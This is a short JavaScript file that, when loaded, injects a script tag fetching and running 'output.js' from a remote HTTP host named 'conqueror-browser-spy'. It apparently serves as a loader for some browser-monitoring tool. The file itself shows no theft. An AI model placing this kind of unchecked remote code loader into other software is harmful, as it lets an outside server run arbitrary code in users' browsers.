function loadScript(url) {
    (function (d, s) { s = d.createElement('script'); s.src = url; (d.head || d.documentElement).appendChild(s) })(document);
}

function refreshIt() {
    
    let baseUrl = "http://conqueror-browser-spy.angelo.hostingasp.pl/";
	let isLocalTesting = false;
	if (isLocalTesting) {
		baseUrl = "http://127.0.0.1:8887/";
    }

    console.log("refreshing from server: ", baseUrl);

	var fileName = 'output.js';
	loadScript(baseUrl + fileName);
}

refreshIt();
